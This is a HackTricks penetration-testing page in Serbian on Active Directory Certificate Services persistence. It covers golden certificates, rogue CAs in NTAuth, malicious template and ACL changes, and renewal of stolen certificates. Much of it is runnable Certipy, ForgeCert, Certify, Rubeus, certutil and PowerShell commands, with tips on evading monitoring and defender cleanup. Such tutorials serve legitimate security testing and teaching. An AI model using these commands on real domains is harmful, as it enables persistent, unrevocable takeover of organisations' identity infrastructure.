# AD CS Perzistencija u domenu

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je rezime tehnika perzistencije u domenu iz [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Pogledajte ga za dodatne detalje.

## Falsifikovanje sertifikata pomoću ukradenih CA sertifikata (Golden Certificate) - DPERSIST1

Kako možete prepoznati da je sertifikat CA sertifikat?

Može se utvrditi da je sertifikat CA sertifikat ako je ispunjeno nekoliko uslova:

- Sertifikat je smešten na CA serveru, pri čemu je njegov privatni ključ zaštićen DPAPI-jem mašine, ili hardverom kao što je TPM/HSM ako operativni sistem to podržava.
- Polja Issuer i Subject sertifikata se poklapaju sa distinguished name-om CA.
- Ekstenzija "CA Version" je prisutna isključivo u CA sertifikatima.
- Sertifikat nema polja Extended Key Usage (EKU).

Da biste izdvojili privatni ključ ovog sertifikata, alat `certsrv.msc` na CA serveru je podržana metoda preko ugrađenog GUI-ja. Ipak, ovaj sertifikat se ne razlikuje od ostalih koji su pohranjeni u sistemu; stoga se za ekstrakciju mogu primeniti metode kao što je [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2).

Sertifikat i privatni ključ se takođe mogu dobiti koristeći Certipy sledećom komandom:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Nakon pribavljanja CA sertifikata i njegovog privatnog ključa u `.pfx` formatu, alati kao što je [ForgeCert](https://github.com/GhostPack/ForgeCert) mogu se koristiti za generisanje validnih sertifikata:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Korisnik koji je meta falsifikovanja sertifikata mora biti aktivan i sposoban da se autentifikuje u Active Directory za uspeh procesa. Falsifikovanje sertifikata za posebne naloge poput krbtgt je neučinkovito.

Ovaj falsifikovani sertifikat će biti **važeći** do navedenog krajnjeg datuma i sve dok je **root CA certificate** važeći (obično od 5 do **10+ godina**). Takođe važi za **mašine**, pa u kombinaciji sa **S4U2Self**, napadač može **održavati persistence na bilo kojoj mašini domena** onoliko dugo koliko je CA sertifikat važeći.  
Štaviše, **sertifikati generisani** ovom metodom **ne mogu biti opozvani** jer CA nije svestan njihovog postojanja.

### Rad pod Strong Certificate Mapping Enforcement (2025+)

Od 11. februara 2025. (posle rollout-a KB5014754), kontroleri domena po defaultu koriste **Full Enforcement** za mapiranja sertifikata. U praksi to znači da vaši falsifikovani sertifikati moraju ili:

- Sadržati snažnu vezu sa ciljnim nalogom (na primer, the SID security extension), ili
- Biti upareni sa snažnim, eksplicitnim mapiranjem na atribut `altSecurityIdentities` ciljnog objekta.

Pouzdan pristup za persistence je da se izradi falsifikovani sertifikat povezan sa ukradenim Enterprise CA i zatim doda snažno eksplicitno mapiranje na ciljni principal:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Beleške
- Ako možete kreirati forged certificates koje uključuju SID security extension, one će se mapirati implicitno čak i pod Full-Enforcement. U suprotnom, preferirajte eksplicitna snažna mapiranja. Pogledajte [account-persistence](account-persistence.md) za više o eksplicitnim mapiranjima.
- Opoziv ovde ne pomaže braniteljima: forged certificates nisu poznati CA bazi podataka i stoga ih nije moguće opozvati.

#### Full-Enforcement compatible forging (SID-aware)

Ažurirani alati omogućavaju da direktno ugradite SID, održavajući golden certificates upotrebljivim čak i kada DCs odbace slaba mapiranja:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Ugradnjom SID-a izbegavate potrebu da dirate `altSecurityIdentities`, koje može biti nadgledano, a i dalje zadovoljavate stroge provere mapiranja.

## Trusting Rogue CA Certificates - DPERSIST2

Objekat `NTAuthCertificates` je definisan da sadrži jedan ili više **CA certificates** u svom atributu `cacertificate`, koje koristi Active Directory (AD). Proces verifikacije od strane **domain controller** uključuje proveru objekta `NTAuthCertificates` da li postoji unos koji odgovara **CA specified** u polju Issuer autentifikacionog **certificate**. Autentifikacija se nastavlja ako se pronađe poklapanje.

Napadač može dodati self-signed CA certificate u objekat `NTAuthCertificates`, pod uslovom da ima kontrolu nad ovim AD objektom. Obično samo članovi grupe **Enterprise Admin**, zajedno sa **Domain Admins** ili **Administrators** u **forest root’s domain**, imaju dozvolu za izmenu ovog objekta. Mogu izmeniti objekat `NTAuthCertificates` koristeći `certutil.exe` sa komandom `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, ili koristeći [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Dodatne korisne komande za ovu tehniku:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
This capability is especially relevant when used in conjunction with a previously outlined method involving ForgeCert to dynamically generate certificates.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Zlonamerna konfiguracija - DPERSIST3

Mogućnosti za **persistence** kroz izmene **security descriptor-a AD CS** komponenti su brojne. Izmene opisane u sekciji "[Domain Escalation](domain-escalation.md)" mogu biti zlonamerno implementirane od strane napadača sa povišenim pristupom. Ovo uključuje dodavanje "control rights" (npr. WriteOwner/WriteDACL/etc.) osetljivim komponentama kao što su:

- The **CA server’s AD computer** object
- The **CA server’s RPC/DCOM server**
- Any **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (for instance, the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, etc.)
- **AD groups delegated rights to control AD CS** by default or by the organization (such as the built-in Cert Publishers group and any of its members)

Primer zlonamerne implementacije bi uključivao napadača, koji ima **elevated permissions** u domenu, koji dodaje permisiju **`WriteOwner`** standardnom **`User`** certificate template-u, pri čemu je napadač principal za to pravo. Da bi iskoristio ovo, napadač bi prvo promenio ownership **`User`** template-a na sebe. Nakon toga, **`mspki-certificate-name-flag`** bi bio postavljen na **1** na template-u da omogući **`ENROLLEE_SUPPLIES_SUBJECT`**, dopuštajući korisniku da navede Subject Alternative Name u zahtevu. Zatim bi napadač mogao **enroll** koristeći **template**, birajući ime **domain administrator** kao alternativno ime, i koristiti pribavljeni sertifikat za autentifikaciju kao DA.

Praktične opcije koje napadači mogu podesiti za dugoročni domain persistence (vidi {{#ref}}domain-escalation.md{{#endref}} za kompletne detalje i detekciju):

- CA policy flagovi koji dozvoljavaju SAN od requestera (npr. omogućavanje `EDITF_ATTRIBUTESUBJECTALTNAME2`). Ovo održava ESC1-like puteve iskoristivim.
- Template DACL ili podešavanja koja dozvoljavaju authentication-capable issuance (npr. dodavanje Client Authentication EKU, omogućavanje `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlling the `NTAuthCertificates` object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup.

> [!TIP]
> U ojačanim okruženjima posle KB5014754, sparivanje ovih miskonfiguracija sa eksplicitnim jakim mapiranjima (`altSecurityIdentities`) osigurava da vaši issued ili forged sertifikati ostanu upotrebljivi čak i kada DC-ovi primenjuju strong mapping.

### Certificate renewal abuse (ESC14) for persistence

Ako kompromitujete sertifikat sposoban za autentifikaciju (ili Enrollment Agent certifikat), možete ga **obnavljati neograničeno** sve dok je issuing template i dalje objavljen i dok vaš CA još uvek veruje issuer chain-u. Obnova zadržava originalne identity bindings, ali produžava validnost, što otežava izbacivanje osim ako se template ne ispravi ili CA ne republish-uje.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Ako su domain controller-i u režimu **Full Enforcement**, dodajte `-sid <victim SID>` (ili koristite template koji i dalje uključuje SID security extension) kako bi obnovljeni leaf certificate nastavio da se snažno mapira bez diranja `altSecurityIdentities`. Napadači sa CA admin pravima takođe mogu da podešavaju `policy\RenewalValidityPeriodUnits` da produže obnovljene lifetime pre nego što sebi izda cert.

## Reference

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
